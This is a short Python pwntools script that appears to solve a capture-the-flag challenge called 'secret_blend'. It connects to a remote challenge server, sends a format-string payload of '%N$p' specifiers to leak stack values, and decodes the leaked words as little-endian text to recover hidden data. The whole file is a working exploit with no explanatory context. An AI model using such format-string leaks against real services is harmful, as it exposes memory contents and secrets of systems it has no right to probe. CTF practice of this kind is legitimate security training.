from pwn import *

context.binary = elf = ELF('secret_blend')
#pr = process()
pr = remote('chals1.apoorvctf.xyz', 3003)

pr.recvline()
pr.recvline()
pr.sendline(b'%6$p %7$p %8$p %9$p %10$p %11$p %12$p %13$p')
pr.recvline()
ln = pr.recvline().strip().split(b' ')
print(ln)
for l in ln:
    try:
        print(int(l.decode(),16).to_bytes(8, 'little').decode(), end='')
    except:
        print(l)